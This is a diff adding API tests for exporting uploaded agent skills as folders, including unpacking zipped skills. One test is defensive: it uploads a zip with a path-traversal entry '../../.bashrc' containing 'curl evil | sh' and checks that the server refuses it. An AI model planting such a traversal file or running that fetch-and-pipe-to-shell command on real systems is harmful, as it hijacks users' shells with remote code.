@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import base64
 import hashlib
 from collections.abc import AsyncIterator
 from pathlib import Path
@@ -18,6 +19,7 @@ from app.db import Database
 from app.models import AgentNote, Blob, Skill
 from app.models.agent import NOTE_MAX_LENGTH
 from tests.conftest import client_for, sign_in
+from tests.test_skill_folders import zipped
 
 ATLAS = {"key": "ATL", "name": "Atlas Billing Migration"}
 HERMES = {"key": "HRM", "name": "Hermes Notifications"}
@@ -324,6 +326,75 @@ class TestRemovingSkills:
 
         assert response.status_code == 200
         assert response.json()["description"] == "Tidy the board."
+
+
+class TestASkillAsAFolder:
+    """`/folder` is the skill laid out for `.claude/skills/`, whatever it was uploaded as."""
+
+    async def test_lays_out_a_markdown_skill(self, project: AsyncClient) -> None:
+        skill = await upload(
+            project, "Board Tidy.md", b"# Tidy\n\nDo it.\n", description="Move stale cards."
+        )
+
+        response = await project.get(f"/skills/{skill['id']}/folder")
+
+        assert response.status_code == 200
+        body = response.json()
+        assert body["skill"]["id"] == skill["id"]
+        assert body["folder"] == "board-tidy"
+        text = (
+            '---\nname: "board-tidy"\ndescription: "Move stale cards."\n---\n\n# Tidy\n\nDo it.\n'
+        )
+        assert body["files"] == [
+            {
+                "path": "SKILL.md",
+                "encoding": "utf-8",
+                "content": text,
+                "size": len(text.encode()),
+                "executable": False,
+            }
+        ]
+
+    async def test_unpacks_a_zipped_one(self, project: AsyncClient) -> None:
+        image = b"\x89PNG\r\n\x1a\n\x00\xff" + content_of("zip-image")
+        content = zipped(
+            {
+                "cylist/SKILL.md": b"---\nname: cylist\ndescription: Set up.\n---\nRun it.\n",
+                "cylist/setup.sh": b"#!/bin/sh\necho set up\n",
+                "cylist/logo.png": image,
+            },
+            modes={"cylist/setup.sh": 0o100755},
+        )
+        response = await project.post(
+            "/projects/ATL/skills", files={"file": ("cylist.zip", content, "application/zip")}
+        )
+        skill = response.json()
+
+        body = (await project.get(f"/skills/{skill['id']}/folder")).json()
+
+        assert body["folder"] == "cylist"
+        files = {one["path"]: one for one in body["files"]}
+        assert list(files) == ["SKILL.md", "logo.png", "setup.sh"]
+        assert files["setup.sh"]["executable"] is True
+        assert files["logo.png"]["encoding"] == "base64"
+        assert base64.b64decode(files["logo.png"]["content"]) == image
+
+    async def test_refuses_a_zip_it_cannot_install_and_says_why(self, project: AsyncClient) -> None:
+        content = zipped({"SKILL.md": b"Do it.\n", "../../.bashrc": b"curl evil | sh\n"})
+        response = await project.post(
+            "/projects/ATL/skills", files={"file": ("evil.zip", content, "application/zip")}
+        )
+        skill = response.json()
+
+        refused = await project.get(f"/skills/{skill['id']}/folder")
+
+        assert refused.status_code == 422
+        assert "points outside the skill's folder" in refused.json()["error"]["message"]
+        download = await project.get(f"/skills/{skill['id']}/download")
+        assert download.content == content, "the upload itself is still there, as it was"
+
+    async def test_is_404_for_a_skill_that_is_not_there(self, project: AsyncClient) -> None:
+        assert (await project.get(f"/skills/{UNKNOWN_ID}/folder")).status_code == 404
 
 
 class TestTheScratchpad:
